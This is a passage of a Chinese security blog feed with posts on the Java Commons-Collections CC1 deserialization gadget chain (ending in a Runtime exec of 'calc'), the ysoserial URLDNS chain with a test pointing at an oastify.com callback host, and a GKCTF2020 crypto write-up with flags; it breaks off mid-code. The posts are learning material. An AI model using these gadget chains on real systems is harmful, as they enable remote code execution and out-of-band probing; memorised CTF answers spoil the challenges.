InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),\n                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)\n        &#125;;\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);\n\n        HashMap map = new HashMap();\n        map.put(&quot;key&quot;,&quot;value&quot;);\n        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);\n        for (Map.Entry entry:transformedMap.entrySet())&#123;\n            entry.setValue(&quot;a&quot;);\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290214217.png\" alt=\"image-20230429021427161\" /></p>\n<p>这里可以看到是成功弹出计算器，也就是成功调用了的，那么接下来找到一个遍历数组的地方就可以了这个・最好是 readObject 里面有，或者是通过 readObject 能间接的调用到的，这里是在 AnnotationInvocationHandler 中的 readObject 中直接找到了一个遍历 Map 的功能，这里还有一个 setvalue 方法，这就很符合我们的需求，这里因为它不是 public 类，这里需要通过反射区获取</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290225727.png\" alt=\"image-20230429022551678\" /></p>\n<p>看一下构造方法，第一个参数是一个集成了 Annotation 的一个泛型，Annotation 是注解，第二个是 Map</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290232515.png\" alt=\"image-20230429023253466\" /></p>\n<p>在循环中还有两个判断需要注意一下，它首先获取了传入注解的成员变量，然后用键值对的 key 在成员变量中查找，要不为空，所以我传入了 Retention 注解，其中有一个 value</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290235476.png\" alt=\"image-20230429023520435\" /></p>\n<p>然后将 map 的键值改为 value，然后判断能不能强转，这个地方肯定是能够进入的，但是最后的 value 是我们不能直接控制的，我们需要将 value 给为 Runtime.class 这里是需要使用 ConstantTransformer 这个类去间接改变 value 的值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290239251.png\" alt=\"image-20230429023935195\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161320125.png\" alt=\"image-20230516132045046\" /></p>\n<p>这样讲传入的值设定后能够成功调用</p>\n<p>最后整个流程<br />\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230709171356788.png\" alt=\"image-20230709171356788\" /></p>\n",
            "tags": [
                "java安全",
                "CC1"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "java反序列化",
            "date_published": "2023-04-14T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇记录 java 反射的基础知识，参考 p 牛的 java 安全漫谈系列</p>\n<h2 id=\"反序列化方法的对比\"><a class=\"anchor\" href=\"#反序列化方法的对比\">#</a> 反序列化方法的对比</h2>\n<p>java 对于反序列化提供了一个更加灵活的方法 writeObject，允许开发者在序列化流中添加数据，在反序列化中使用了一个类似__wekeup 的方法 readObject，但是 readObject 倾向于解决反序列化时如何 <code>还原</code> 一个对象但是 wakeup 更倾向于对对象的初始化，下面通过 demo 来展示 php 和 java 反序列化的过程</p>\n<h3 id=\"php反序列化\"><a class=\"anchor\" href=\"#php反序列化\">#</a> php 反序列化</h3>\n<p>php 的反序列化过程是一个内部的过程，对于开发人员来说是不能直接参与的，如果想要将内容插入反序列化数据流中，就需要再序列化之前保存在属性中</p>\n<pre><code class=\"language-php\">&lt;?php\nclass demo &#123;\n    public $username;\n    private $password;\n//    function __construct()&#123;\n//        $this-&gt;username=&quot;admin&quot;;\n//        $this-&gt;password=&quot;admin123&quot;;\n//    &#125;\n&#125;\n$a = new demo();\necho serialize($a);\n</code></pre>\n<p>在这段代码中可以看到，如果没有构造函数在 serialize 函数执行后，对象就已经序列化完成</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304021555338.png\" alt=\"image-20230402155525256\" /></p>\n<p>如果想要插入内容，只能通过赋值给属性</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304021556255.png\" alt=\"image-20230402155630216\" /></p>\n<h3 id=\"java反序列化\"><a class=\"anchor\" href=\"#java反序列化\">#</a> java 反序列化</h3>\n<p>在 php 中，反序列化漏洞很少是由 wakeup 函数触发的，具体也可以在<a href=\"https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\"> CTFshow-web 入门 php 反序列化 - CTFshow | Clown の Blog = (xcu.icu)</a> 也可以看出，其实多数是通过反序列化控制对象属性来控制代码的函数调用，间接控制代码执行来进行一些危险操作，而在 java 反序列化的过程中，开发者是可以参与的，会使用大量的 readObject 和 writeObject 方法，序列化对象时会调用 writeObject 方法，参数类型是 ObjectoutputStream, 开发者可以将任何内容写入，也可以任意读出</p>\n<p>User 类</p>\n<pre><code class=\"language-java\">package Clown_serialization;\n\nimport java.io.Serializable;\n\npublic class User implements Serializable &#123;\n    private String name;\n    private int age;\n\n    public User(String name, int age)&#123;\n        this.name = name;\n        this.age = age;\n        System.out.println(&quot;构造方法设置name和age：name=&quot;+name+&quot; age：&quot;+age);\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        this.age = age;\n    &#125;\n&#125;\n</code></pre>\n<p>userSerialization.java</p>\n<pre><code class=\"language-java\">package Clown_serialization;\n\nimport javax.xml.bind.DatatypeConverter;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n\npublic class userSerialization &#123;\n    public static void main(String[] args) throws Exception&#123;\n\n        User user = new User(&quot;test&quot;,21);\n\n        //输出\n        ByteArrayOutputStream Output = new ByteArrayOutputStream();\n        ObjectOutputStream Outputs = new ObjectOutputStream(Output);\n\n        //将对象user序列化为字节数组\n        Outputs.writeObject(user);\n        Outputs.writeObject(&quot;this is a test&quot;);\n        byte[] userobj = Output.toByteArray();\n        System.out.println(DatatypeConverter.printHexBinary(userobj));\n        for (byte b:userobj)&#123;\n            System.out.print((b&amp;0xff));\n        &#125;\n\n        //输入流\n        ByteArrayInputStream Input = new ByteArrayInputStream(userobj);\n        ObjectInputStream Inputs = new ObjectInputStream(Input);\n\n        //将保存在内存内的字节输出反序列化\n        User user1 = (User) Inputs.readObject();\n        String message = (String) Inputs.readObject();\n        System.out.println(&quot;\\n&quot;+message);\n        System.out.println(user1.getName());\n    &#125;\n&#125;\n\n</code></pre>\n<p>在这个代码的序列化部分我通过  Outputs.writeObject (&quot;this is a test&quot;); 加入了一句话，最后通过 String message = (String) Inputs.readObject (); 反序列化出来</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304080036630.png\" alt=\"image-20230408003625598\" /></p>\n<p>16 进制转为 ascll</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304080042673.png\" alt=\"image-20230408004223633\" /></p>\n<h3 id=\"python反序列化\"><a class=\"anchor\" href=\"#python反序列化\">#</a> python 反序列化</h3>\n<p><a href=\"https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\">python 的序列化和反序列化 - Python | Clown の Blog = (xcu.icu)</a> 我的这篇博客上面的记录还是较为详细的这里不再展开</p>\n<h2 id=\"ysoserial\"><a class=\"anchor\" href=\"#ysoserial\">#</a> ysoserial</h2>\n<p>这个是 urlDNS 是 ysoserial 中的一条利用链，首先先 down 下来这个项目源码<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\"> frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</span></p>\n<p>通过 idea 打开后先配置 maven</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131156983.png\" alt=\"image-20230413115652933\" /></p>\n<p>配置完成后先将 pom.xml 中缺失的依赖下载下来，下载完成直到不爆红了就可以开始调试了，这里如果一直爆红可以检查一下配置文件是不是都选择了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131158270.png\" alt=\"image-20230413115853213\" /></p>\n<p>在 pom 的配置文件中找到入口点（主类和 mian 函数）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131201107.png\" alt=\"image-20230413120134074\" /></p>\n<p>这里 Ctrl + 左键进到主类，运行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131203071.png\" alt=\"image-20230413120342039\" /></p>\n<p>这里直接运行会有报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131205624.png\" alt=\"image-20230413120531585\" /></p>\n<p>看报错有可以看到这里没有加上参数，这里点击运行的编辑配置</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131210545.png\" alt=\"image-20230413121011510\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131209941.png\" alt=\"image-20230413120955893\" /></p>\n<p>这里就能成功执行了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132101897.png\" alt=\"image-20230413210119575\" /></p>\n<p>这就是一个序列化后的数据，下面分析一下这个链的利用过程</p>\n<h3 id=\"urldns\"><a class=\"anchor\" href=\"#urldns\">#</a> URLDNS</h3>\n<p>这个 ysoserial 链子在 java 中使用内置类，没有对第三方库的依赖，发起一次 dns，它主要的作用是用于测试目标站点是否有反序列化漏洞，下面是 ysoserial 中的 URLDNS 的代码</p>\n<pre><code class=\"language-java\">public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;\n    // URLDNS 类实现了 ObjectPayload 接口，该接口可以用于创建可序列化的对象。\n    // 该类的主要目的是为了演示 Java 反序列化漏洞。\n\n    public Object getObject(final String url) throws Exception &#123;\n        // getObject 方法用于创建一个包含 URL 对象的 HashMap。\n        // 由于 URL 类的 hashCode 方法是非常耗时的，因此在创建 HashMap 时，我们需要避免进行 DNS 解析。\n        // 在这里，我们使用了一个自定义的 URLStreamHandler 类来避免 DNS 解析。\n\n        //Avoid DNS resolution during payload creation\n        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.\n        //避免在创建有效负载期间进行 DNS 解析，由于 java.net.URL.handler 字段是瞬态的，因此它不会成为序列化有效负载的一部分。\n        URLStreamHandler handler = new SilentURLStreamHandler();\n\n        // HashMap that will contain the URL\n        // 用于存储 URL 的 HashMap。\n        HashMap ht = new HashMap();\n\n        // URL to use as the Key\n        // 用作键的 URL。\n        URL u = new URL(null, url, handler);\n\n        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n        // 值可以是任何可序列化的对象，但我们使用 URL 作为键是为了触发 DNS 查找。\n\n        ht.put(u, url);\n\n        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n        // 在上面的 put 操作期间，URL 的 hashCode 被计算并缓存。这里将其重置，以便下一次调用 hashCode 时会触发 DNS 查找。\n        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);\n\n        return ht;\n    &#125;\n\n    public static void main(final String[] args) throws Exception &#123;\n        //main 方法用于运行 URLDNS 类。\n        PayloadRunner.run(URLDNS.class, args);\n    &#125;\n\n    /**\n     * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.\n     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior\n     * using the serialized object.&lt;/p&gt;\n     *\n     * &lt;b&gt;Potential false negative:&lt;/b&gt;\n     * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the\n     * second resolution.&lt;/p&gt;\n     */\n    // SilentURLStreamHandler 类用于避免在创建 URL 实例时进行 DNS 解析。\n    // DNS 解析用于漏洞检测。在使用序列化对象之前，避免探测给定的 URL 是非常重要的。\n    // 潜在的假阴性：如果测试计算机首先解析 DNS 名称，则目标服务器可能会在第二次解析时得到缓存命中。\n    static class SilentURLStreamHandler extends URLStreamHandler &#123;\n        protected URLConnection openConnection(URL u) throws IOException &#123;\n                        return null;\n                &#125;\n\n                protected synchronized InetAddress getHostAddress(URL u) &#123;\n                        return null;\n                &#125;\n        &#125;\n&#125;\n</code></pre>\n<h3 id=\"利用链分析\"><a class=\"anchor\" href=\"#利用链分析\">#</a> 利用链分析</h3>\n<p>在代码的注释中也是给到了他的利用链</p>\n<pre><code class=\"language-perl\">*   Gadget Chain:\n*     HashMap.readObject()\n*       HashMap.putVal()\n*         HashMap.hash()\n*           URL.hashCode()\n</code></pre>\n<p>在上面的 URLDNS 类中 getObject ⽅法，ysoserial 会调⽤这个⽅法获得 Payload。这个⽅法返回的是⼀个对</p>\n<p>象，这个对象就是最后将被序列化的对象，先跟进 Hashmap 的 readObject 方法</p>\n<pre><code class=\"language-java\">private void readObject(java.io.ObjectInputStream s)\n    throws IOException, ClassNotFoundException &#123;\n    // Read in the threshold (ignored), loadfactor, and any hidden stuff\n    s.defaultReadObject();\n    reinitialize();\n    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))\n        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +\n                                         loadFactor);\n    s.readInt();                // Read and ignore number of buckets\n    int mappings = s.readInt(); // Read number of mappings (size)\n    if (mappings &lt; 0)\n        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +\n                                         mappings);\n    else if (mappings &gt; 0) &#123; // (if zero, use defaults)\n        // Size the table using given load factor only if within\n        // range of 0.25...4.0\n        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);\n        float fc = (float)mappings / lf + 1.0f;\n        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?\n                   DEFAULT_INITIAL_CAPACITY :\n                   (fc &gt;= MAXIMUM_CAPACITY) ?\n                   MAXIMUM_CAPACITY :\n                   tableSizeFor((int)fc));\n        float ft = (float)cap * lf;\n        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?\n                     (int)ft : Integer.MAX_VALUE);\n\n        // Check Map.Entry[].class since it's the nearest public type to\n        // what we're actually creating.\n        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);\n        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)\n        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];\n        table = tab;\n\n        // Read the keys and values, and put the mappings in the HashMap\n        for (int i = 0; i &lt; mappings; i++) &#123;\n            @SuppressWarnings(&quot;unchecked&quot;)\n                K key = (K) s.readObject();\n            @SuppressWarnings(&quot;unchecked&quot;)\n                V value = (V) s.readObject();\n            putVal(hash(key), key, value, false, false);\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>这里其自己实现的 <code>readObject()</code>  函数，通过 for 循环将 HashMap 中的值 V value = (V) s.readObject (); 进行反序列化，接着将 HashMap 的键名计算了 hash，跟进 hash 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131135735.png\" alt=\"image-20230413113527693\" /></p>\n<p>跟进 hashCode 函数，由于在 <code>ysoserial</code>  中的 <code>URLDNS</code>  是利用 <code>URL</code>  对象，于是跟进 <code>Java</code>  基本类 <code>URL</code>  中关于 <code>hashCode()</code>  的部分 <code>java/net/URL.java</code> ，由于 <code>hashCode</code>  的值默认为 <code>-1</code> ，因此会执行 <code>hashCode = handler.hashCode(this);</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132132928.png\" alt=\"image-20230413213226874\" /></p>\n<p>这里调用的是 handler 的 hashCode 方法，接着跟进 hashCode</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132138806.png\" alt=\"image-20230413213854747\" /></p>\n<p>先跟进看一下看 getProtocol</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132157244.png\" alt=\"image-20230413215721206\" /></p>\n<p>这里有一个有 getHostAddress 方法，跟进一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132139596.png\" alt=\"image-20230413213941541\" /></p>\n<p>内部有一个 getBuNmae 方法，作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次</p>\n<p>DNS 查询。那么这个进行 dns 查询的链子就很清晰了</p>\n<pre><code class=\"language-perl\">HashMap-&gt;readObject()\nHashMap-&gt;hash()\nURL-&gt;hashCode()\nURLStreamHandler-&gt;hashCode()\nURLStreamHandler-&gt;getHostAddress()\nInetAddress-&gt;getByName()\n</code></pre>\n<h3 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h3>\n<p>前面在 ysoserial 中的利用链就算是分析完了，ysoserial 项目中的东西我感觉好乱，接下来写一个栗子体验下这个过程，这里是参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEIvYXJ0aWNsZS9kZXRhaWxzLzEyMzU2NDYzNQ==\"> (73 条消息) URLDNS 链分析_Sk1y 的博客 - CSDN 博客</span>这个文章</p>\n<pre><code class=\"language-java\">package Clown_URLDNS;\n\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.util.HashMap;\n\n\npublic class URLDNSTest &#123;\n    public static void serialization(Object object)  throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;URLDNS.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;serialization方法成功执行&quot;);\n    &#125;\n\n    public static void unserialization() throws Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;URLDNS.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;unserialization执行成功&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        HashMap hashMap = new HashMap();\n        URL url = new URL(&quot;http://479h74ollbm7xp88wpvage2q3h98xx.oastify.com&quot;);\n\n        /********反射*******/\n        //将hashCode的值不改为*1\n        Class c = url.getClass();\n        Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;);\n        hashcodefield.setAccessible(true);\n        hashcodefield.set(url,1234);//设置hashCode值为1234\n        \n        hashMap.put(url,1);\n        hashcodefield.set(url,-1);//设置hashCode值为-1\n//        serialization(hashMap);\n        unserialization();\n    &#125;\n&#125;\n\n</code></pre>\n<p>整条链子前面已经分析过了，这里前面两个方法是序列化和反序列化方法，不再赘述，在 main 中首先初始化了一个 HashMap 和一个 URl，这里这样写上面也写到过，HashMap 中有 readObject 方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141808252.png\" alt=\"image-20230414180818086\" /></p>\n<p>URL 类中有一个 hashCode</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141808744.png\" alt=\"image-20230414180842694\" /></p>\n<p>接着通过反射设置 hashcode 的值，这里设置为 1234（只要不是 - 1 就行），这里是为了不让 hashcode 方法执行 handler.hashcode 方法发起 dns 请求</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141809489.png\" alt=\"image-20230414180939442\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141821919.png\" alt=\"image-20230414182135797\" /></p>\n<p>然后调用 HashMap.put 方法，这里的 hash（key）会调用前面的 URL 类中的 hashCode</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141812727.png\" alt=\"image-20230414181239651\" /></p>\n<p>最后将 hashcode 的值再设置为 - 1，为了在反序列化的时候能够发起 dns 请求</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141821366.png\" alt=\"image-20230414182151241\" /></p>\n<p>接着看反序列化的过程中的 hashCode 的值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304142005681.png\" alt=\"image-20230414200544534\" /></p>\n",
            "tags": [
                "java安全",
                "反序列化"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/04/05/GKCTF2020/",
            "url": "https://blog.xcu.icu/2023/04/05/GKCTF2020/",
            "title": "GKCTF2020WP",
            "date_published": "2023-04-04T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>通过 buuctf 平台复现一些之前的赛题</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"小学生的密码题\"><a class=\"anchor\" href=\"#小学生的密码题\">#</a> 小学生的密码题</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png\" alt=\"image-20230403104605972\" /></p>\n<p>题目描述就这么多，简单的仿射加密</p>\n<pre><code class=\"language-perl\">c=Ea,b(m)=am+b (mod 26)\nm=Da,b(c)=a−1(c−b) (mod 26)\n</code></pre>\n<p>根据题目描述，可得 a=11，b=6</p>\n<pre><code class=\"language-python\">import base64\nfrom gmpy2 import invert\n\nm = 'welcylk'\na=11\nb=6\nc=''\nk=26\n\n\nfor i in range(len(m)):\n    c +=chr((((invert(a,k))*((ord(m[i])-97)-b))%26)+97)\n\nprint(c)\n//sorcery\n</code></pre>\n<h3 id=\"汉字的秘密\"><a class=\"anchor\" href=\"#汉字的秘密\">#</a> 汉字的秘密</h3>\n<pre><code class=\"language-perl\">王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫\n</code></pre>\n<p>当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的</p>\n<pre><code class=\"language-python\">hz = &quot;田口由中人工大土士王夫井羊壮&quot;\nsz = &quot;00123455567899&quot;\n\nm = &quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&quot;\ns = &quot;&quot;\n\nfor i in m:\n    if i in hz:\n        s += sz[hz.index(i)]\n    else:\n        s += ' '\n# print(s)\n\nll = s.split(&quot; &quot;)\nprint(ll)\ns = ''\nfor i in range(len(ll)):\n    s += chr(int(ll[i]))\nprint(s)\n#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']\n#EJ&gt;CvSHMV7G9R9@?3k\n</code></pre>\n<p>这里转化后，发现转为字符后不规律，这里即将前几个字符对应 flag 转换，是一个变异凯撒</p>\n<pre><code class=\"language-python\">hz = &quot;田口由中人工大土士王夫井羊壮&quot;\nsz = &quot;00123455567899&quot;\n\nm = &quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&quot;\ns = &quot;&quot;\n\nfor i in m:\n    if i in hz:\n        s += sz[hz.index(i)]\n    else:\n        s += ' '\n# print(s)\n\nll = s.split(&quot; &quot;)\nprint(ll)\ns = ''\nfor i in range(len(ll)):\n    s += chr(int(ll[i])+i+1)\nprint(s.lower())\n#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']\n#flag&#123;you_are_good&#125;\n</code></pre>\n<h3 id=\"babycrypto\"><a class=\"anchor\" href=\"#babycrypto\">#</a> babycrypto</h3>\n<pre><code class=\"language-perl\"># n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L\n# e:65537\n# enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361\n# p&gt;&gt;128&lt;&lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L\n</code></pre>\n<p>拿到题后就是上面的内容，看起来是 RSA，20 年的题了现在可以直接分解出来这个 n，直接常规接 RSA 即可</p>\n<pre><code class=\"language-python\">from gmpy2 import *\nimport libnum\n\nn = 22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453\ne = 65537\np = 139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359\nq = 160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667\nc = 1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361\n\nN = (p-1)*(q-1)\nd = invert(e,N)\nm = pow(c,d,n)\nprint(libnum.n2s(int(m)))\n//b'flag&#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&#125;'\n</code></pre>\n<h3 id=\"backdoor\"><a class=\"anchor\" href=\"#backdoor\">#</a> Backdoor</h3>\n<p>这个题下载后给了三个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png\" alt=\"image-20230404152640752\" /></p>\n<p>题目名叫后门，给了一个公式<strong>弱素数生成公式</strong></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png\" alt=\"image-20230404152753424\" /></p>\n<p>flag.enc</p>\n<pre><code class=\"language-perl\">MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg==\n</code></pre>\n<p>这个值解 base64 之后转 10 进制</p>\n<pre><code class=\"language-perl\">59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768\n</code></pre>\n<p>pub.pem</p>\n<pre><code class=\"language-perl\">-----BEGIN PUBLIC KEY-----\nMFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX/zmNv\n8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ==\n-----END PUBLIC KEY-----\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3Rhc2sucHk=\">task.py</span></p>\n<pre><code class=\"language-python\">#!/usr/bin/python\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nimport gmpy2, binascii\nimport base64\nfrom FLAG import flag\n\ndef rsa_encrypt(message):\n    with open('./pub.pem' ,'r') as f:\n        key = RSA.import_key(f.read())\n    e = key.e\n    n = key.n\n    c = pow(bytes_to_long(flag), e, n)\n \n    ciphertext = binascii.hexlify(long_to_bytes(c))\n    return ciphertext\n\nif __name__ == &quot;__main__&quot;:\n    text = 